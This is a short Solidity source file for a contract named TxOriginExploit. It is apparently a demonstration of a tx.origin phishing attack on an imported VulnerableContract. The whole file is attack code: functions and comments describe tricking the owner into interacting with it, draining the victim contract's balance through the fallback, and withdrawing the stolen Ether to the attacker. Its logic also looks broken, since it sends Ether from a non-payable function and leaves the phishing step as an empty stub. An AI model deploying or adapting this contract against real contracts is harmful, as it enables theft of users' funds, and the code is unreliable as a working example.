// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract TxOriginExploit {
    VulnerableContract public vulnerableContract;
    address public attacker;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        attacker = msg.sender;
    }

    // This function initiates the exploit by tricking the owner into interacting with this contract
    function initiateAttack() external {
        require(msg.sender == attacker, "Only attacker can initiate");

        // Send funds to the vulnerable contract as part of the setup
        vulnerableContract.deposit{value: 1 ether}();
    }

    // Fallback function to withdraw funds from the vulnerable contract
    fallback() external payable {
        // Call the withdraw function in the vulnerable contract
        vulnerableContract.withdraw(address(vulnerableContract).balance);
    }

    // Trick the owner into calling this function
    function trickOwner() external {
        // This simulates the attacker crafting a situation where the owner interacts
        // with this contract, such as through phishing.
    }

    // Withdraw stolen funds
    function withdrawStolenFunds() external {
        require(msg.sender == attacker, "Only attacker can withdraw");
        payable(attacker).transfer(address(this).balance);
    }

    // Allow receiving Ether
    receive() external payable {}
}
